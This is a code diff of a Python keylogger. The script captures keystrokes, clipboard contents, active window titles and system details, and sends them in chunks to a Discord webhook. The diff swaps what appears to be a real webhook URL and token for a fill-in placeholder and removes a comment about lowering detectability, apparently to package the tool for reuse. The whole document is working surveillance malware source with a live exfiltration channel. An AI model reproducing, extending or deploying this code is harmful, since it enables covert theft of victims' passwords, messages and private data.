@@ -11,10 +11,10 @@ import subprocess
 
 # Configuration
 LOG_FILE = "key_log.txt"
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1248392956709437541/PRnRnhWu38IMbs5Rv_T5IA7YEYyUuBE_MQf_ivdroxaRR6w6Dh7mMutq5AWXMgu5OnRE"
-SEND_INTERVAL = 30  # Increased interval to reduce detectability
-BUFFER_FLUSH_INTERVAL = 20  # Increased interval to save resources
-MAX_DISCORD_MESSAGE_LENGTH = 2000  # Discord's message size limit
+DISCORD_WEBHOOK_URL = "ENTER YOUR DISCOR CHANNEL WEBHOOK HERE"
+SEND_INTERVAL = 30  # Time interval to send to discord 
+BUFFER_FLUSH_INTERVAL = 20  # Time interval to save resources
+MAX_DISCORD_MESSAGE_LENGTH = 2000  # Discord's message size limit (Do not change)
 
 # Initialize buffer for storing key logs
 log_buffer = []
@@ -69,6 +69,8 @@ async def send_log_to_discord():
         if log_data:
             payload_chunks = split_log_data(log_data)
 
+            #Discord message layout
+            
             for chunk in payload_chunks:
                 payload = {
                     "content": f"""----------------
@@ -141,7 +143,7 @@ async def flush_buffer_to_file():
                 f.write(''.join(log_buffer))
             log_buffer.clear()
 
-# Async function to monitor clipboard (reduced frequency)
+# Async function to monitor clipboard 
 async def monitor_clipboard():
     last_text = clipboard.paste()
     while True:
@@ -174,7 +176,7 @@ async def log_active_window():
                 f.write(f'\n[Active Window]: {current_window}\n')
             last_window = current_window
 
-# Function to log system information
+# Function to log system information (add any additional ones)
 def log_system_info():
     with open(LOG_FILE, 'a') as f:
         f.write(f"Node Name: {platform.node()}\n")
